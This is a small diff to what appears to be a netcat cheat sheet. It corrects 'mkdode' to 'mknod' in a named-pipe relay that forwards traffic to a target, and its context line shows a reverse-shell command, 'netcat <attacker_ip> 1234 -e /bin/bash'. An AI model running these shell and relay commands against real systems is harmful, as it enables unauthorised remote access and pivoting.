@@ -66,6 +66,6 @@ netcat <attacker_ip> 1234 -e /bin/bash
 ```
 ```sh
 # on relay
-mkdode mypipe p
+mknod mypipe p
 netcat -l -p 6789 < mypipe | netcat <target_ip> 80 > mypipe
 ```
